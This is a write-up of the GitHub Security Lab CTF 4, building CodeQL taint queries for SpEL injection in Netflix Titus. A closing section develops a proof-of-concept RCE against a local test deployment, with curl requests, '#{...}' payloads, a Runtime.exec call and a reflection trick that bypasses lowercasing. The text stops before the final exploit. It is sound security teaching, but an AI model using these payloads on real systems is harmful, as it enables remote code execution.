# GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition - Writeup

## Introduction

This is my write-up for the [GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition](https://securitylab.github.com/ctf/codeql-and-chill). I will try to share my full thought process during the whole exercise, including mistakes and dead ends, so that it's easier to understand how I reached the solutions and why I took certain decisions.

So, without further ado, let's start!

## Contents

Here is a summary of what is covered by this writeup:

- _Challenge problem_: This section offers a description of the main goal of the challenge.

- _Solution steps_: Each step of the challenge has its own section with details about how it was solved, using code snippets when needed.
    - Steps 1.1 - 1.8 cover the development of a query to detect the first security issue of the challenge.
    - Step 2 covers the improvement of the query to detect the second security issue.
    - Step 3 adds another improvement to detect potential issues where the execution flow involves Exception handling.
    - Step 4.1 describes how, using the query's findings, a functional exploit was developed to attack the vulnerable version of the target application .
    - Step 4.2 covers potential mitigations and how the query can be improved to take them into account.

- _Conclusions_: Lastly, this section reflects on the challenge and lessons learned.


## Challenge problem

The problem definition is very clear: we need to use [CodeQL](https://securitylab.github.com/tools/codeql) to automatically detect the Java Expression Language (EL) Injection vulnerabilities found by GitHub Security Lab research team in Netflix's Titus Control Plane [(GHSL-2020-028)](https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus). These issues were caused by unsanitized user-controlled input reaching custom error building methods that interpolate EL expressions, which in turn allows for command injection in the affected system.

The CTF description guides us through several steps that allow us to tackle the problem incrementally: each step builds upon the previous one to obtain new results or refine the existent ones.

Let's see how I wrote my CodeQL query to solve each one of those steps.

## Step 1.1

Since this is a problem involving a taint flow (user-controlled, thus tainted, data flowing through the code until reaching a dangerous method), the first logical step is to find the start of the flow: the sources. The challenge itself tells us these are the first parameter of `ConstraintValidator.isValid(...)` methods.

To be able to identify such specific methods (and not all methods simply named `isValid`), we first need to find the appropriate type (`ConstraintValidator`), so we start our query by defining that type:

~~~ql
class ConstraintValidator extends RefType {
    ConstraintValidator() {
        this.hasQualifiedName("javax.validation", "ConstraintValidator")
    }
}
~~~

By using the qualified name, we make sure we don't get confused with other classes in other packages which could also be named `ConstraintValidator`.

Since we are looking for method _declarations_ (to be able to refer to their parameters), we will need to use CodeQL's `Method` type (instead of `MethodAccess`). It should be as easy as finding `Method`s with `ConstraintValidator` as their declaring types, right?

~~~ql
class ConstraintValidatorSource extends Method {
	ConstraintValidatorSource() {
        this.getName() = "isValid" and
        this.getDeclaringType() instanceof ConstraintValidator
    }
}
~~~

Sadly that doesn't work as expected. It returns two results, but we can't navigate to them in the source code: clicking on them does nothing.

After some time thinking about this, the answer to why this isn't working seems clear: `ConstraintValidator` is an interface of a standard library (package `javax.validation`), so if we try to find declarations of the `isValid` method in the Titus' source code, of course we won't find what we want. Actually, one of the step's hints says just that:

- Pay attention to get only results that pertain to the project source code.

We actually need to find classes implementing `ConstraintValidator` that override the `isValid` method. After looking at the documentation, and searching for existing similar queries, I found the `overrides` predicate of the `Method` class. According to its documentation, this does exactly what we need:

~~~ql
 /** Holds if this method (directly) overrides the specified callable. */
~~~

So, on one hand we need to find what we already have, `Method`s named `isValid` the declaring type of which is `ConstraintValidator` and, on the other hand, `Methods` which override those. To achieve that, we can write a little predicate which should help make things clearer:

~~~ql
predicate overridesAConstraintValidatorMethod(Method override) {
    exists(Method base | 
        base.getSourceDeclaration().getDeclaringType() instanceof ConstraintValidator and
        override.overrides(base)
    )
}
~~~

This will tell us if the `Method` passed as argument is an override of `ConstraintValidator.isValid`. Exactly what we want! We can now rewrite our source-finding class as follows:

~~~ql
class ConstraintValidatorSource extends Method {
	ConstraintValidatorSource() {
        this.getName() = "isValid" and
        overridesAConstraintValidatorMethod(this)
	}
}
~~~

That returns the expected 6 results, all in the Titus' codebase! Great, but we are not looking for the method declarations, but rather their first arguments, so let's finish this step by writing our `isSource` predicate:

~~~ql
override predicate isSource(DataFlow::Node source) { 
    exists(ConstraintValidatorSource isValid | 
        source.asParameter() = isValid.getParameter(0)
    )
}
~~~

Perfect! Step 1.1 completed.

## Step 1.2

Now we need to find the other end of the flow: the sink. We are told that this time we are looking for `ConstraintValidatorContext.buildConstraintViolationWithTemplate(...)` _calls_, which means it's turn for the `MethodAccess` type to shine.

Following the same logic as in step 1.1, we first define the `ConstraintValidatorContext` type:

~~~ql
class ConstraintValidatorContext extends RefType {
    ConstraintValidatorContext() {
        this.hasQualifiedName("javax.validation", "ConstraintValidatorContext")
    }
}
~~~

And then we can find the calls on methods `buildConstraintViolationWithTemplate` with the declaring type we just defined. This time, since no interface or class inheritances are involved, we can write our sink class more directly:

~~~ql
class ConstraintValidatorContextSink extends MethodAccess {
    ConstraintValidatorContextSink() {
        this.getCallee().getName() = "buildConstraintViolationWithTemplate" and
        this.getCallee().getDeclaringType() instanceof ConstraintValidatorContext
    }
}
~~~

Again, our sink is actually the parameter of such calls, since that's the element the tainted data will reach, so our sink predicate looks like this:

~~~ql
 override predicate isSink(DataFlow::Node sink) { 
    exists(ConstraintValidatorContextSink buildWithTemplate |
        sink.asExpr() = buildWithTemplate.getArgument(0)
    )
}
~~~

With this we get our expected 5 results. We can keep going!

## Step 1.3

Ok, we got our sources and we got our sinks. Time to connect them! For this, we will use the template of `TaintTracking::Configuration` provided by the step description. We only need to fill in the `isSource` and `isSink` predicates with the ones from steps 1.1 and 1.2.

~~~ql
/** @kind path-problem */
import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph

class ELInjectionInCustomConstraintValidatorsConfig extends TaintTracking::Configuration {
    ELInjectionInCustomConstraintValidatorsConfig() { this = "ELInjectionInCustomConstraintValidatorsConfig" }

    override predicate isSource(DataFlow::Node source) { 
        exists(ConstraintValidatorSource isValid | 
            source.asParameter() = isValid.getParameter(0)
        )
    }

    override predicate isSink(DataFlow::Node sink) { 
        exists(ConstraintValidatorContextSink buildWithTemplate |
            sink.asExpr() = buildWithTemplate.getArgument(0)
        )
    }
}
~~~

But as the description tells us, this returns 0 results. Well, disappointing but expected. Let's see how we can improve it.


## Step 1.4

Having worked with source code static analysis before, this step makes a lot of sense. If you have point A and point Z, and you expect them to be connected but they aren't, what do you do? Well, you try to find all connections for points A-B, A-B-C, A-B-C-D... until you see the flow stopping. That's how you know which element is stopping you from reaching Z as you expected.

Luckily, CodeQL provides the `PartialPathGraph` utilities to easily do this. What we will try next is, as the description suggests, disregard our sink and see which connections are made from our source to any other element. Of course, this is computationally expensive, so we limit this search in two ways:

1. We select only one source for this analysis
2. We limit the obtained flows' length to 10 (this means, only flows connecting up to 10 nodes will be shown)

For the first limitation, we will implement a new class which, using our original source class, selects a subset of sources. We arbitrarily select the only source of the `SchedulingConstraintSetValidator` class:

~~~ql
class DebugConstraintValidatorSource extends ConstraintValidatorSource {
    DebugConstraintValidatorSource() {
        this.getDeclaringType().getName() = "SchedulingConstraintSetValidator" 
    }
}
~~~

And for the second one, we override a predicate in our `TaintTrackingConfig`:

~~~ql
override int explorationLimit() { result =  10} // we can increase or decrease this number to obtain flows with different lengths if needed
~~~

Our `select` statement looks like this:

~~~ql
//...
import DataFlow::PartialPathGraph
//...

from MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink
where
    cfg.hasPartialFlow(source, sink, _) and
    exists(DebugConstraintValidatorSource specificSource | source.getNode().asParameter() = specificSource.getParameter(0))
select sink, source, sink, "Partial flow from unsanitized user data"
~~~

The full debugging query can be found in the `query_1.4.ql` file.

A lot of path results appear when we execute the query! We are interested in the longest ones, since the others are just partial paths that still propagate taint to the next element. With that in mind, we see that the flow propagation is indeed stopped at ```container.getHardConstraints``` and ```container.getSoftConstraints``` calls as the description says. They reach the inner `return` argument in those functions' implementations, though:

~~~java
public Map<String, String> getHardConstraints() {
    return hardConstraints; // flow hends here
}

public Map<String, String> getSoftConstraints() {
    return softConstraints; // flow ends here
}
~~~

So it seems we somehow need to tell CodeQL that taint propagation continues through this calls even if it doesn't consider so out-of-the-box.

## Step 1.5

This step asks us why we think this taint propagation is being stopped at those methods. Well, my assumption is that getters don't propagate taint because of it probably generating a lot of false positives. It's pretty naive to assume that assigning a tainted value to an object's attribute automatically taints all the other attributes too. For instance, given the following object:

~~~java
public class SomeObject {
    private String tainted;
    private int somethingElse;

    public SomeObject(String tainted, int somethingElse) {
        this.tainted = tainted;
        this.somethingElse = somethingElse;
    }

    public String getTainted() {
        return tainted;
    }

    public String getSomethingElse() {
        return somethingElse;
    }
}

someObject = SomeObject("tainted", 123);
int notTainted = someObject.getSomethingElse()
dangerousSink(notTainted);
~~~

At first glance, if we consider the string `"tainted"` to be a dangerous user input, then the `someObject` instance would be tainted too. Because of this, the assumption that every getter on that instance returns a tainted value leads to a false positive in the `dangerousSink` call. That's probably why CodeQL keeps it safe and doesn't propagate taint by default to getters on tainted object instances.

It'll be our job to determine specifically which getters are propagating taint.

## Step 1.6

So let's do that! First, we need to write some CodeQL to select the calls which are stopping our taint. The following types should help with that:

~~~ql
class GetConstraints extends Method {
    GetConstraints() {
        (
            this.getName() = "getHardConstraints" or
            this.getName() = "getSoftConstraints"
        ) and
        this.getDeclaringType().hasQualifiedName("com.netflix.titus.api.jobmanager.model.job", "Container")
    }
}

class GetConstraintsCall extends MethodAccess {
    GetConstraintsCall() {
        this.getCallee() instanceof GetConstraints
    }
}
~~~

Now we can use `GetConstraintsCall` to obtain all the calls to the problematic methods (even those which aren't influenced by our partial flows, but that isn't a problem since they won't be affecting us). Ok, but what do we connect them with?

At first, I thought we should connect the last element we saw in the partial flows (the return statement of `getHardConstraints` and `getSoftConstraints` implementations) with the next element we would expect to see in the flow (`keySet()`), but not only that was brittle, it caused other problems down the line, because semantically it doesn't make sense to connect the return of one method (`get*Constraints`) with the call to an unrelated one (`keySet`), even if in this case they are concatenated.

What we actually want to do (and what the description says) is connecting the _qualifier_ of the call (the object the method is called on) with its return value in _the call site_, which is actually the call itself. Actually, if we take a closer look at the partial flows, the call itself isn't there: the flow jumps from the qualifier to the method declaration.

So, in short, we want to connect `container` with `getSoftConstraints()` and `getHardConstraints()` called on them. Since we have the appropriate types already defined, that should be easy:

~~~ql
predicate getConstraintsStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(GetConstraintsCall call | 
        step1.asExpr() = call.getQualifier() and
        step2.asExpr() = call 
    )
}
~~~

Doing a "Quick Evaluation" on this predicate seems to return correct results. We can now add this step to our taint tracking configuration:

We now need to use this steps in a special class to add a step to our taint tracking configuration:

~~~ql
class MyAdittionalTaintSteps extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node step1, DataFlow::Node step2) {
        getConstraintsStep(step1, step2)
    }
}
~~~

And indeed running the full debugging query again produces a new additional path, one step further but still not reaching the sink. This time, `keySet` is stopping us in the same way `get*Constraints` did.

## Step 1.7

We'll need to repeat the strategy. This time, we want to tell CodeQL that the keys of these `Map`s are actually tainted (which isn't always the case for all `Map`s). To restrict it to specifically `softConstraints` and `hardConstraints` maps, we will be connecting `keySet` calls with `get*Constraints` calls on a `container` object, which produce `Map`s with tainted keys.

~~~ql
predicate keySetStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(GetConstraintsCall call, MethodAccess keySetCall |
        keySetCall.getCallee().getName() = "keySet" and
        keySetCall.getReceiverType() = call.getType() and
        step1.asExpr() = keySetCall.getQualifier() and
        step2.asExpr() = keySetCall
    )
}
~~~

So basically we are connecting `keySet` calls to its qualifiers, with the restriction of the qualifier being a `GetConstraintsCall`.

By adding this step to `MyAdittionalTaintSteps` and running again our debugging query, we see that our flow has now reached the constructor of a `HashSet`. But we are still far from our desired sink.

## Step 1.8

To fix this taint step, the strategy is similar to the previous ones: our flow stopped at the parameter of the `HashSet` constructor, so we want to connect it with the actual `HashSet` returned by the `ConstructorCall`. Building from previous steps, it's easy to connect the call and its argument:

~~~ql
predicate hashSetConstructorStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(ConstructorCall call |
        call.getConstructedType().getQualifiedName().matches("java.util.HashSet<%>") and
        step1.asExpr() = call.getArgument(0) and
        step2.asExpr() = call
    )
}
~~~

Note that in this case we needed to use a `matches` predicate to find the class' qualified name, since `HashSet` is a parameterized class. The `%` character tells CodeQL that any string could be between `<` and `>` in the class name.

Now we add the additional steps to our taint tracking configuration:

~~~ql
class MyAdittionalTaintSteps extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node step1, DataFlow::Node step2) {
        getConstraintsStep(step1, step2) or
        keySetStep(step1, step2) or
        hashSetConstructorStep(step1, step2)
    }
}
~~~

We run our debugging query once more... And a lot more partial flows appear! The longest one, finally, reaches our sink. This means that the original query will report one result. Great, we are halfway there!

The query up to this point can be seen in the `query_1.8.ql` file.

## Step 2. Second Issue

We found the issue in `SchedulingConstraintSetValidator`, but there's another interesting source in `SchedulingConstraintValidator` which apparently reaches a sink, so let's see, following the same strategy, why our query isn't reporting it. We need to adjust our `DebugConstraintValidatorSource`:

~~~ql
class DebugConstraintValidatorSource extends ConstraintValidatorSource {
    DebugConstraintValidatorSource() {
        this.getDeclaringType().getName() = "SchedulingConstraintValidator" 
    }
}
~~~

And now we can rerun our debugging query. We immediately see that `keySet` is stopping us again, because it's being called directly on the `Map` received as parameter in the `isValid` call, so no `Container` qualifier here. Additionally, we see that other calls will be causing further problems down the line:

~~~java
Set<String> namesInLowerCase = value.keySet().stream().map(String::toLowerCase).collect(Collectors.toSet());
~~~

All of `keySet`, `stream`, `map` and `collect` seem problematic.

### Naive approach

Initially I followed a naive approach and wrote all these predicates to fix this issue:

~~~ql
predicate qualifierToCallStep(string callName, RefType qualifierType, DataFlow::Node step1, DataFlow::Node step2) {
    exists(MethodAccess call |
        call.getCallee().getName() = callName and
        call.getReceiverType() = qualifierType and
        step1.asExpr() = call.getQualifier() and
        step2.asExpr() = call
    )
}

predicate keySetStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(RefType qualifierType, GetConstraintsCall call | 
        (
            qualifierType = call.getType() or
            // Added this
            qualifierType.getQualifiedName().matches("java.util.Map<%,%>")
        ) and
        qualifierToCallStep("keySet", qualifierType, step1, step2)
    )
}

predicate streamStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(RefType qualifierType |
        qualifierType.getQualifiedName().matches("java.util.Set<%>") and
        qualifierToCallStep("stream", qualifierType, step1, step2)
    )
}

predicate mapStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(RefType qualifierType |
        qualifierType.getQualifiedName().matches("java.util.stream.Stream<%>") and
        qualifierToCallStep("map", qualifierType, step1, step2)
    )
}

predicate collectStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(RefType qualifierType |
        qualifierType.getQualifiedName().matches("java.util.stream.Stream<%>") and
        qualifierToCallStep("collect", qualifierType, step1, step2)
    )
}
~~~

And then added them to `MyAdittionalTaintSteps`:

~~~ql
class MyAdittionalTaintSteps extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node step1, DataFlow::Node step2) {
        getConstraintsStep(step1, step2) or
        keySetStep(step1, step2) or
        hashSetConstructorStep(step1, step2) or
        streamStep(step1, step2) or
        mapStep(step1, step2) or
        collectStep(step1, step2)
    }
}
~~~

But that was a lot of code and also very repetitive, even though I generalized some of it with `qualifierToCallStep`. So I looked at the default queries (written by professionals, not an amateur like me :-P) and doing so helped me remember [recursive predicates](https://help.semmle.com/QL/ql-handbook/recursion.html) from `CodeQL` detective tutorials. With that, we can write a little recursion which will connect our source with certain methods consecutively called on it. Worth a shot, since it will help us remove a lot of code!

### Optimization with recursive predicates

We first want to identify all methods which propagate taint if called on a source:

~~~ql
class ChainableMethod extends Method {
    ChainableMethod() {
        this instanceof GetConstraints or
        this.getName().regexpMatch("keySet|stream|map|collect")
    }
}
~~~

And then we want to connect calls to those methods if their qualifier is a source, or the qualifier of its qualifier is, recursively. We don't want to connect any of these calls with the next if they don't share the source as qualifier, because that could pollute other queries. That's why we try to be as precise as possible without adding more connections than needed.

The following predicate does exactly that:

~~~ql
predicate chainedCallsOnSourceStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(ConstraintValidatorSource source, MethodAccess chainedCall |
        chainedCall.getQualifier*() = source.getParameter(0).getAnAccess() and
        chainedCall.getMethod() instanceof ChainableMethod and
        step1.asExpr() = chainedCall.getQualifier() and
        step2.asExpr() = chainedCall
    )
}
~~~

Note how we use `getAnAccess` on our `source` element, since originally `source.getParameter(0)` returns the declaration of that parameter, and we want references of it inside the method, which will be the potential qualifiers we are looking for. The `chainedCall.getQualifier*()` statement is what does the recursion magic and will find all the chained method calls at once.

With this, our additional taint steps are much clearer and we use a lot less code:

~~~ql
class ChainedCallsOnSourceTaintStep extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node step1, DataFlow::Node step2) {
        chainedCallsOnSourceStep(step1, step2)
    }
}
~~~

Moreover, this also covers the additional taint steps we added for the first issue! (except the `HashSet` constructor, so we keep that additional taint step):

~~~ql
class HashSetConstructorTaintStep extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node step1, DataFlow::Node step2) {
        hashSetConstructorStep(step1, step2)
    }
}
~~~

Now we can __finally__ run the complete query (not the debug one) and obtain the 2 (only) real results! 

The query up to this point can be seen in the `query_2.ql` file.

## Step 3. Errors and exceptions

Now, this step won't modify the actual results of our query (we'll still get 2 results), but it helps to generalize it so it's useful in other codebases.

The basic idea is that some methods can throw exceptions the message of which contain the input they received in the first place. So, as the description says, we want to propagate flow in patterns like the following:

~~~java
try {
    parse(tainted); // throws Exception
} catch (Exception e) {
    sink(e.getMessage()) // 'tainted' was added to the message
}
~~~

### Methods accessing the Exception message

First we need to know which methods are called on `Exception` objects inside a `catch` clause, since those are the end nodes of our new additional taint step.

To find them, we can run a "Quick Evaluation" on the following instruction:

~~~ql
exists(MethodAccess call, CatchClause catch |
    catch.getVariable().getAnAccess() = call.getQualifier())
~~~

By reading documentation about the `CatchClause` we discover this `getVariable` predicate, which returns the caught Exception in the `catch` block, and by calling `getAnAccess` we get all references inside the block of that variable. With that we can obtain all method calls called on that object. By reviewing them, we see that the ones that give access to their message have names with the pattern "get%Message", so that will be our heuristic:

~~~ql
class HeuristicGetMessageCall extends MethodAccess {
    HeuristicGetMessageCall() {
        this.getMethod().getName().matches("get%Message")
    }
}
~~~

### Methods throwing a caught Exception

Now, we need to find the starting node of our additional taint step. That will be method calls inside a `try` block that has `catch` blocks associated which capture the Exception the original method is throwing. Luckily, the `CatchClause` has a `getTry` predicate which returns its associated `try` statement, so we can write the following predicate to establish the relation between the method call, the try block and the catch block (and the glue here is the Exception thrown/caught):

~~~ql
class ThrowingCall extends MethodAccess {
    CatchClause catch;

    ThrowingCall() {
        exists(Exception exception |
            this.getEnclosingStmt().getEnclosingStmt*() = catch.getTry().getBlock() and
            this.getMethod().getSourceDeclaration().getAnException() = exception and
            exception.getType().getAnAncestor() = catch.getACaughtType()
        )
    }
    
    CatchClause getCatch() {
        result = catch
    }
}
~~~

As can be seen, we define `ThrowingCall` as a method call for which the following is true:

- It's inside a `try` block
- Throws an exception of certain type
- The `try` block has a `catch` block associated which catches that exception (or a supertype of it) 

Running a "Quick Evaluation" on this class allows us to inspect said methods, and we can see that their relevant method (the one which could be reflected in the Exception message) is almost always the first one. We will use that knowledge next.

### Additional taint step

Great! We have methods that throw caught exceptions and methods inside `catch` clauses which return the exception message. Time to connect those two:

~~~ql
predicate throwingCallToGetMessageStep(DataFlow::Node step1, DataFlow::Node step2) {
    exists(ThrowingCall throwingCall, HeuristicGetMessageCall getMessageCall |
        throwingCall.getCatch().getVariable().getAnAccess() = getMessageCall.getQualifier() and
        step1.asExpr() = throwingCall.getArgument(0) and 
        step2.asExpr() = getMessageCall
    )
}
~~~

The connection here is establishing by telling CodeQL that the Exception thrown by the `ThrowingCall` is the same as the qualifier of the `HeuristicGetMessageCall`. In that sense, if the tainted parameter of a `ThrowingCall` is reflected in the Exception message, this predicate will connect those two elements. Time to add the last additional taint step:

~~~ql
class ThrowingCallTaintStep extends TaintTracking::AdditionalTaintStep {

    override predicate step(DataFlow::Node step1, DataFlow::Node step2) {
        throwingCallToGetMessageStep(step1, step2)
    }
}
~~~

And with that, our query is pretty much finished. It doesn't return false positives and doesn't have false negatives, so we did a good job adapting it to the analyzed codebase!

The query up to this point can be seen in the `query_3.ql` file.

## Step 4.1. PoC

Time for exploitation! Let's see if, with the knowledge we gathered, we can finally reproduce the RCE in Titus Control Plane.

### Reaching the sinks

We need to know how to reach our sinks with data we control. Since the vulnerabilities reside in `SchedulingConstraintValidator` and `SchedulingConstraintSetValidator`, let's look for beans annotated with the constraints they define: `SchedulingConstraint` and `SchedulingConstraintSet`. One of the first results this search returns is the class `Container`, which has the following attributes (among others):

~~~java

@SchedulingConstraintSetValidator.SchedulingConstraintSet
class Containter {

    // ...

    @SchedulingConstraintValidator.SchedulingConstraint
    private final Map<String, String> softConstraints;

    @SchedulingConstraintValidator.SchedulingConstraint
    private final Map<String, String> hardConstraints;

    // ...

}
~~~

Great, this makes sense. While writing our query we saw validations on `Container` and `Map` instances, and calls to `getSoftConstraints` and `getHardConstraints`, so we are on track. These two attributes will be validated with the vulnerable validators and, in case of error, we will reach the sinks. As we saw in the vulnerable code, the data that reaches the sinks are the keys of these `Map`s:

~~~java
 @Override
public boolean isValid(Map<String, String> value, ConstraintValidatorContext context) {
    Set<String> namesInLowerCase = value.keySet().stream().map(String::toLowerCase). collect(Collectors.toSet()); // value.keySet() are the map's keys
    HashSet<String> unknown = new HashSet<>(namesInLowerCase);
    unknown.removeAll(JobConstraints.CONSTRAINT_NAMES);
    if (unknown.isEmpty()) { // unknown needs to be non-empty, so we need to provide a key which isn't in JobConstraints.CONSTRAINT_NAMES
        return true;
    }
    context.buildConstraintViolationWithTemplate("Unrecognized constraints " + unknown)
            .addConstraintViolation().disableDefaultConstraintViolation(); // therefore, the injection must be in the map's keys which aren't in JobConstraints.CONSTRAINT_NAMES
    return false;
}
~~~

Now we just need to know where we can provide a `Container` object which contains our malicious `softConstraints` and/or `hardConstraints`.

### Building the request

By reading the `README.md` of our target (Netflix's [Titus Control Plane](https://github.com/Netflix/titus-control-plane/)), we quickly identify a call to the "jobs" API which receives a container as part of the request:

~~~bash
curl localhost:7001/api/v3/jobs \
  -X POST -H "Content-type: application/json" -d \
  '{
    "applicationName": "localtest",
    "owner": {"teamEmail": "me@me.com"},
    "container": {
      "image": {"name": "alpine", "tag": "latest"},
      "entryPoint": ["/bin/sleep", "1h"],
      "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]}
    },
    "batch": {
      "size": 1,
      "runtimeLimitSec": "3600",
      "retryPolicy":{"delayed": {"delayMs": "1000", "retries": 3}}
    }
  }'
~~~

So let's try it! After cloning the [vulnerable version]((https://github.com/Netflix/titus-control-plane/commit/8a8bd4c1b4b63e17520804c6f7f6278252bf5a5b)) of Titus Control Plane and deploying it with `docker-compose` (luckily, it just works out-of-the-box), we can make the request, just adding a `softConstraints` element to it.

To get the proper structure of `softConstraints`, some googling was necessary, but in the end documentation about it could be found thanks to [Google's cache](https://webcache.googleusercontent.com/search?q=cache:StpzhXdi9yQJ:https://github.com/Netflix/titus-api-definitions/blob/master/doc/titus-v3-spec.md+&cd=4&hl=en&ct=clnk&gl=es) (for some reason, the documentation about the `Constraints` object has been removed from the [current version](https://github.com/Netflix/titus-api-definitions/blob/master/doc/titus-v3-spec.md) of the page):

| Field | Type | Label | Description |
| ----- | ---- | ----- | ----------- |
| constraints | Constraints.ConstraintsEntry | repeated | (Optional) A map of constraint name/values. If multiple constraints are given, all must be met (logical 'and'). |

And regarding `Constraints.ConstraintsEntry`:

| Field | Type | Label | Description |
| ----- | ---- | ----- | ----------- |
| key | string | optional | |
| value | string | optional | |

Ok, now we know what the expected format is:

~~~json
"softConstraints":{"constraints": {"injection here": "value"}}
~~~

### Reproducing the EL Injection

Let's try a simple EL Injection (as they appear [here](https://docs.jboss.org/hibernate/validator/5.1/reference/en-US/html/chapter-message-interpolation.html#section-interpolation-with-message-expressions)) to confirm our assumptions:

~~~json
"softConstraints":{"constraints": {"${3*3}": "value"}}
~~~

~~~json
{"statusCode":400,"message":"Invalid Argument: {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [${3*3}]', type: 'HARD''}"}
~~~

Right, we see the message we expected (`Unrecognized constraints`) but our injection appears literally, it wasn't interpolated. So something's wrong. Let's try to dig and see how interpolation is done.

If we look for the string "interpolator" in the codebase, we find an interesting class `SpELMessageInterpolator`. There, a `TemplateParserContext` is used, and if we inspect its constructor, we find the following:

~~~java
public TemplateParserContext() {
    this("#{", "}");
}
~~~

Aha, so our injections must start with `#{`. Let's try:

~~~bash
curl localhost:7001/api/v3/jobs \
    -X POST -H "Content-type: application/json" -d \
    '{
        ...
        "container": {
        ...
        "softConstraints":{"constraints": {"#{3*3}": "a"}}
        },
        ...
    }'
~~~

Response:

~~~json
{"statusCode":400,"message":"Invalid Argument: {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [9]', type: 'HARD''}"}
~~~

There we go! Now `#{3*3}` was interpolated and the result (`9`) is shown in the error message. That confirms our EL Injection! Now that we have a request which triggers the vulnerability, building the exploit should be easy! ...Right?

### Basic exploit

The bread and butter of RCE exploits in Java is `Runtime.exec`, so let's try to use it:

~~~java
"#{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"touch /tmp/pwned\")}"
~~~

Sadly, this is the response:

~~~json
{"statusCode":500,"message":"Unexpected error: HV000149: An exception occurred during message interpolation"}
~~~

After checking that the file wasn't created despite the error (it wasn't), I realized two things: 1) the simple exploit failed, and 2) this is a somewhat "blind" injection, i.e. the errors don't give information about what failed. So it seems that this will be a real pain to debug.

### Casing issues

At this point, I tried infinite variations of the payload. I executed it piece by piece to see where it was going wrong, I tried with other interpolation formats, I tried accessing default Spring EL objects (like `param`) to see if we could manipulate the request in some way (without realizing this isn't JSP EL injection but rather SPEL injection)... Nothing seemed to work, always the damned 500 error.

In the end, I reduced the tests to the absurd and tried the following:

~~~java
"#{\"some\".concat(\"thing\")}"
~~~

And then it worked, the word "something" appeared in the error message. What? Why? But if I tried this:

~~~java
"#{\"something\".toString()}"
~~~

it failed! What's the difference? Only the casing in the method name...

And then it clicked me. I remembered what's happening with our input before reaching the sink:

~~~java
value.keySet().stream().map(String::toLowerCase)
~~~

Damn it, it's being converted to lower case!! That rules out almost any method call, since most of them are _camelCase_, and of course every class name too, because they always start with an uppercase letter. Could it be that this vulnerability wasn't actually exploitable?

### Looking for options

At this point, it seemed sensible to look into the other vulnerability we found, the one in `SchedulingConstraintSetValidator`. But although the code seemed more promising:

~~~java
public boolean isValid(Container container, ConstraintValidatorContext context) {
        // ...
        Set<String> common = new HashSet<>(container.getSoftConstraints().keySet());
        common.retainAll(container.getHardConstraints().keySet()); // both softConstraints and hardConstraints' keys are added to the map unmodified
        // ...
        context.buildConstraintViolationWithTemplate(
                "Soft and hard constraints not unique. Shared constraints: " + common // it reaches the sink as is
        ).addConstraintViolation().disableDefaultConstraintViolation();
        // ...
    }
~~~

I realized it couldn't be used. It was checking if constraint names were repeated in both `softConstraints` and `hardConstraints`, which means that, for our injection to be interpolated here, it first needed to be validated in `SchedulingConstraintSetValidator`, which would crash if we included methods or classes with uppercase letters on them. So the same problem applies: how do we reference this classes and methods without using uppercase at all?

More hours of trying crazy things. Looking at the documentation, I found the `@<identifier>` syntax, which references beans registered in the context. Maybe there was something useful there? I searched the codebase for `registerBean`, and found the following;

~~~java
.registerBean("constraints", jobConfiguration)
.registerBean("asserts", jobAssertions);
~~~

These beans can be accessed like `#{@constraints}` and `#{@asserts}`, but their classes didn't seem useful, so back to square one.

I looked in the codebase for usages of `#{}` to try to get inspiration, but none helped much. The values referenced were almost always attributes of the specific Constraint annotation, and neither `SchedulingConstraint` or `SchedulingConstraintSet` had useful attributes.

I also thought of maybe referencing another field under our control so that it gets dynamically evaluated and therefore it can contain uppercase letters without them being directly in the constraint. But the only way I found after thoroughly reading the documentation was using `validatedParam`, which should reference the map being validated, but it has that damn "P" which discards it as an option.

And as I was almost ready to give up to frustration, after one night of good sleep, one of those "eureka!" moments revealed itself in the form of Java's Reflection.


### Reflection to the rescue

As I was playing with EL to try to find a way to circumvent our uppercase problem, I stumbled upon a feature that seemed helpful. As some sort of syntax sugar, EL allows to call getter methods as if they were properties of the object, so "object.getSomething()" can be also written as "object.something". That seemed promising, since `get<Oneword>` methods could be called, which gave us access to the `Class` class via a `getClass` call on any object (for instance, `#{"".class}`).

After some time playing with `Class` and the lowercase-only methods that can be called on it, I started to read documentation about the objects returned by those methods. I was still thinking in calling `forName`, but I couldn't because of the casing, and I also couldn't call it like `class.method("something")` because that only works with methods without parameters. But, in the `Class` class' Javadoc, next to `getMethod`, there's [`getMethods`](https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html#getMethods--), which __can__ be called as `class.methods`, which returns all methods of the class.

Which means... We can get the list of all methods and access them by index! (e.g. `class.methods[0]`). Now that could work!

It's just a matter of finding the index of the method we want. Let's start with `forName`, since that will allow us to access any class in the classpath. At first I started manually with a payload like the following:

~~~json
"softConstraints":{"constraints": {"#{\"\".class.class.methods[0].name}"}}
~~~

That payload is equivalent to:

~~~java
"".getClass().getClass().getMethods()[0].getName()
~~~

So we:

- Get an empty String
- Call to its `getClass()` method (obtaining a `Class<String>` object)
- Call to `getClass()` again (obtaining a `Class<Class>` object)
- Call `getMethods()` (obtaining the list of all methods of `Class`)
- Access its first element.

Luckily, that was `forName` in the first try! But if not we could've kept trying with `methods[1]`, `methods[2]`...

### Building the exploit

Awesome, we got our method! Now, to obtain a `Class<Runtime>` object (first step of our desired RCE), it should be as easy as doing:

~~~json
